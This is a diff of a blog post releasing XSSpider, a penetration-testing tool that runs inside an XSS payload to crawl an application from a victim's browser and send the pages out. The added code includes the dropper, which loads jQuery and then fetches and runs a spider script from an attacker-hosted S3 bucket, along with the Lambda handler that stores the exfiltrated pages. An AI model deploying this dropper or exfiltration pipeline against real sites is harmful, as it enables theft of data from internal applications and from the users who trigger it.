@@ -3,7 +3,7 @@ layout: post
 title:  "Tool Release: XSSpider"
 date:   2020-09-10 12:00:00
 image: 
-  path: /assets/img/security/XSSpider/Header.png
+  path: /assets/img/security/XSSpider/xsspider-logo.png
 author: Ryan
 ---
 
@@ -11,8 +11,6 @@ author: Ryan
 {:toc .large-only}
 
 Cross-Site Scriptng (XSS) is commonly used to steal credentials and session cookie information, but what good are credentials when the targetted application can’t be accessed from the outside? Or perhaps we've found XSS in a target where entire areas of the application are locked down to higher priviledged users, what can we do as attackers to learn more about its hidden funtionality? XSSpider is a unique spidering tool which is meant to run within an XSS payload, spidering from the victim’s browser and exfiltrating everything it finds for later review. Find it [Here](https://github.com/ScienceVikings/XSSpider) on GitHub
-
-![XSSpider](/assets/img/security/XSSpider/xsspider-logo.png)
 
 ## Background
 While conducting an assessment, I discovered a [Blind XSS](https://www.acunetix.com/blog/articles/blind-xss/) vulnerability into an unknown application. Initial information gathering showed a few key things:
@@ -25,7 +23,25 @@ Not wanting to leave any stones unturned, I was determined to learn more about t
 ## Initial Payload
 After discovering an injection point for XSS, the initial payload consists of a dropper to pull in resurces for the spider and additional code.
 
-<script src="https://gist.github.com/RBoutot/25321416d3c51d802064c8a90ca519a2.js?file=XSSpider_payload.js"></script>
+```python
+var spider_URL = 'https://{{S3_Payload_Bucket}}.s3.amazonaws.com/spider.js';
+
+if (typeof(jQuery) == 'undefined') {
+    (function(e, s) {
+        e.src = s;
+        e.onload = function() {
+            Execute()
+        };
+        document.head.appendChild(e);
+    })(document.createElement('script'), '//code.jquery.com/jquery-latest.min.js')
+} else {
+    Execute()
+}
+
+function Execute() {
+    $.getScript(spider_URL)
+}
+```
 
 #### Walk-through - Payload.js:
 * **Line 1**: Sets variable to the path where the spider is hosted
@@ -49,7 +65,37 @@ Server-side resources for the spider are currently hosted in AWS, but a Docker v
 * **API-Gateway**: Hosts our public-facing endpoint for uploading the data
 * **Lambda**: Python-based, handles the uploaded data by parsing out structure information and restoring content to a readable form in S3
 
-<script src="https://gist.github.com/RBoutot/25321416d3c51d802064c8a90ca519a2.js?file=XSSpider_store_data.py"></script>
+```python
+raw_path = re.sub('^(\.{1,2}\/)*','',unquote(data['path'])).strip('/').lower()
+url_parts = raw_path.split('?')
+if len(url_parts) == 1:
+    path_parts = url_parts[0].split('/')   
+    if len(path_parts) == 1:
+        if path_parts[0] == '':
+            filename = '/index.html'
+        else:
+            filename = '/' +(path_parts[0] + '.html' if '.' not in path_parts[0] else path_parts[0])
+    elif len(path_parts) > 1:
+        path = '/' + '/'.join(path_parts[:-1])
+        filename = '/' + (path_parts[-1] + '.html' if '.' not in path_parts[-1] else path_parts[-1])
+elif len(url_parts) == 2:
+    if url_parts[0] == '':
+        path = '/index'
+    else:
+        path = '/' + url_parts[0].split('.')[0]
+    filename = '/%s.html'%(hashlib.md5(url_parts[1].encode()).hexdigest())
+
+file_data = base64.b64decode(data['body']).decode('utf-8')
+if file_data.startswith('data:image'):
+    file_data = base64.decodebytes(bytes(file_data.split(',')[1],'utf-8'))
+
+s3_response = s3.put_object(
+    Bucket=bucket_name,
+    Key=data['site']+path+filename,
+    Body=file_data,
+    ACL='private'
+)
+```
 
 #### Walk-through - Handler.py:
 * **Lines 1-2**: The raw path is extracted from the data, separating the main url from any potential parameters
